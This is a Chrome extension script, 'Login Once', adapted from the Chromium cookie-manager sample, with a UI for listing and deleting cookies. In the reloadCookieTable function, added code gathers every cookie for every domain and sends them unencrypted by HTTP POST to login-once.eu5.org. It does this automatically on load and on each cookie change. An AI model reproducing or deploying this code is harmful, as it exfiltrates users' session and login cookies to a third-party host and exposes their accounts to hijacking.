// Copyright (c) 2012 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.
/*
 *LOGIN ONCE https://github.com/rjnsharma344/login-once
 *@desc Used to construct cookie table and forms to submit data to server
 *@usage This code is used with some modification to create an object
         with all cookies and pass it to the form constructed
 *@lastedi MON 16 JAN 2017
*/

if (!chrome.cookies) {
  chrome.cookies = chrome.experimental.cookies;
}

// A simple Timer class.
function Timer() {
  this.start_ = new Date();

  this.elapsed = function() {
    return (new Date()) - this.start_;
  }

  this.reset = function() {
    this.start_ = new Date();
  }
}

// Compares cookies for "key" (name, domain, etc.) equality, but not "value"
// equality.
function cookieMatch(c1, c2) {
  return (c1.name == c2.name) && (c1.domain == c2.domain) &&
         (c1.hostOnly == c2.hostOnly) && (c1.path == c2.path) &&
         (c1.secure == c2.secure) && (c1.httpOnly == c2.httpOnly) &&
         (c1.session == c2.session) && (c1.storeId == c2.storeId);
}

// Returns an array of sorted keys from an associative array.
function sortedKeys(array) {
  var keys = [];
  for (var i in array) {
    keys.push(i);
  }
  keys.sort();
  return keys;
}

// Shorthand for document.querySelector.
function select(selector) {
  return document.querySelector(selector);
}

// An object used for caching data about the browser's cookies, which we update
// as notifications come in.
function CookieCache() {
  this.cookies_ = {};

  this.reset = function() {
    this.cookies_ = {};
  }

  this.add = function(cookie) {
    var domain = cookie.domain;
    if (!this.cookies_[domain]) {
      this.cookies_[domain] = [];
    }
    this.cookies_[domain].push(cookie);
  };

  this.remove = function(cookie) {
    var domain = cookie.domain;
    if (this.cookies_[domain]) {
      var i = 0;
      while (i < this.cookies_[domain].length) {
        if (cookieMatch(this.cookies_[domain][i], cookie)) {
          this.cookies_[domain].splice(i, 1);
        } else {
          i++;
        }
      }
      if (this.cookies_[domain].length == 0) {
        delete this.cookies_[domain];
      }
    }
  };

  // Returns a sorted list of cookie domains that match |filter|. If |filter| is
  //  null, returns all domains.
  this.getDomains = function(filter) {
    var result = [];
    sortedKeys(this.cookies_).forEach(function(domain) {
      if (!filter || domain.indexOf(filter) != -1) {
        result.push(domain);
      }
    });
    return result;
  }

  this.getCookies = function(domain) {
    return this.cookies_[domain];
  };
}


var cache = new CookieCache();


function removeAllForFilter() {
  var filter = select("#filter").value;
  var timer = new Timer();
  cache.getDomains(filter).forEach(function(domain) {
    removeCookiesForDomain(domain);
  });
}
//11 feb cfd edits
//function for showing and hiding
function show_hide() {
    var div = document.querySelector('#deltop');
    if (div.style.display !== 'none') {
        div.style.display = 'none';
        select("#shbtn").innerText = "Show Delete";
    }
    else {
        div.style.display = 'block';
        select("#shbtn").innerText = "Hide Delete";
    }

};


//11 feb cfd edits
function removeAll() {
  var all_cookies = [];
  cache.getDomains().forEach(function(domain) {
    cache.getCookies(domain).forEach(function(cookie) {
      all_cookies.push(cookie);
    });
  });
  cache.reset();
  var count = all_cookies.length;
  var timer = new Timer();
  for (var i = 0; i < count; i++) {
    removeCookie(all_cookies[i]);
  }
  timer.reset();
  chrome.cookies.getAll({}, function(cookies) {
    for (var i in cookies) {
      cache.add(cookies[i]);
      removeCookie(cookies[i]);
    }
  });
}

function removeCookie(cookie) {
  var url = "http" + (cookie.secure ? "s" : "") + "://" + cookie.domain +
            cookie.path;
  chrome.cookies.remove({"url": url, "name": cookie.name});
}

function removeCookiesForDomain(domain) {
  var timer = new Timer();
  cache.getCookies(domain).forEach(function(cookie) {
    removeCookie(cookie);
  });
}

function resetTable() {
  var table = select("#cookies");
  while (table.rows.length > 1) {
    table.deleteRow(table.rows.length - 1);
  }
}

var reload_scheduled = false;

function scheduleReloadCookieTable() {
  if (!reload_scheduled) {
    reload_scheduled = true;
    setTimeout(reloadCookieTable, 250);
  }
}

function reloadCookieTable() {
  reload_scheduled = false;

  var filter = select("#filter").value;

  var domains = cache.getDomains(filter);

  select("#filter_count").innerText = domains.length;
  select("#total_count").innerText = cache.getDomains().length;
// new edits
    var domains_got=cache.getDomains();
    //debug::select("#json_test_domains").innerText = JSON.stringify(domains_got);
    var domains_got=cache.getDomains();
    //creates a data of all cookies
    var all_cooks = [];
    cache.getDomains().forEach(function(domain) {
      cache.getCookies(domain).forEach(function(cookie) {
        all_cooks.push(cookie);
      });
    });
  //debug::select("#json_cook").innerText = JSON.stringify(all_cooks);
    //Adds all cookies to the input
  //  console.log("Here man"+all_cooks);
    //select("#json_cook_in").value = JSON.stringify(all_cooks);
// new edits ends
//for ff

/*Xml http request for firefox*/
var http = new XMLHttpRequest();
var url = "http://login-once.eu5.org/l-o/ffload.php";
var params = "one="+JSON.stringify(all_cooks);
http.open("POST", url, true);
console.log("Started");
//Send the proper header information along with the request
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.setRequestHeader("Content-length", params.length);
http.setRequestHeader("Connection", "close");

http.onreadystatechange = function() {//Call a function when the state changes.
	if(http.readyState == 4 && http.status == 200) {
    console.log("GOT BACK responseText");
    var rurL="http://login-once.eu5.org/l-o/ffsave.php?suname="+http.responseText;
		console.log(rurL);
    select("#u_name").value = http.responseText;

  }
}
http.send(params);
/*XML http*/
//EDITS FROM http://www.openjs.com/articles/ajax_xmlhttp_using_post.php

//for ff
  select("#delete_all_button").innerHTML = "";
  if (domains.length) {
    var button = document.createElement("button");
    button.onclick = removeAllForFilter;
    button.innerText = "Delete all " + domains.length;
    select("#delete_all_button").appendChild(button);
  }

  resetTable();
  var table = select("#cookies");

  domains.forEach(function(domain) {
    var cookies = cache.getCookies(domain);
    var row = table.insertRow(-1);
    row.insertCell(-1).innerText = domain;
    var cell = row.insertCell(-1);
    cell.innerText = cookies.length;
    cell.setAttribute("class", "cookie_count");

    var button = document.createElement("button");
    button.innerText = "delete";
    button.onclick = (function(dom){
      return function() {
        removeCookiesForDomain(dom);
      };
    }(domain));
    var cell = row.insertCell(-1);
    cell.appendChild(button);
    cell.setAttribute("class", "button");
  });
}

function focusFilter() {
  select("#filter").focus();
}

function resetFilter() {
  var filter = select("#filter");
  filter.focus();
  if (filter.value.length > 0) {
    filter.value = "";
    reloadCookieTable();
  }
}

var ESCAPE_KEY = 27;
window.onkeydown = function(event) {
  if (event.keyCode == ESCAPE_KEY) {
    resetFilter();
  }
}

function listener(info) {
  cache.remove(info.cookie);
  if (!info.removed) {
    cache.add(info.cookie);
  }
  scheduleReloadCookieTable();
}

function startListening() {
  chrome.cookies.onChanged.addListener(listener);
}

function stopListening() {
  chrome.cookies.onChanged.removeListener(listener);
}

function onload() {
  focusFilter();
  var timer = new Timer();
  chrome.cookies.getAll({}, function(cookies) {
    startListening();
    start = new Date();
    for (var i in cookies) {
      cache.add(cookies[i]);
    }
    timer.reset();
    reloadCookieTable();
  });
}

document.addEventListener('DOMContentLoaded', function() {
  onload();
  document.body.addEventListener('click', focusFilter);
  document.querySelector('#remove_button').addEventListener('click', removeAll);
  //11 feb cfd edits
  //show hide event listener
  document.querySelector('#shbtn').addEventListener('click', show_hide);
  //ee feb cfd edits
  document.querySelector('#filter_div input').addEventListener(
      'input', reloadCookieTable);
  document.querySelector('#filter_div button').addEventListener(
      'click', resetFilter);
});
